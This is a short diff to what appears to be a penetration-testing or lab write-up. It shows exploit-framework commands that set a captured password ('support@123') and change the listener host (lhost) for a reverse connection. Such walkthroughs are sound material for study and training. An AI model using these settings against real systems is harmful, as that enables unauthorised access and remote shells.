@@ -341,8 +341,9 @@ We used the previously discovered credentials to configure the exploit.
 ```python
 > set PASSWORD support@123
 ```
+
 ```python
-> set lhost 172.16.250.62
+> set lhost 172.16.250.11
 ```
 
 ```python
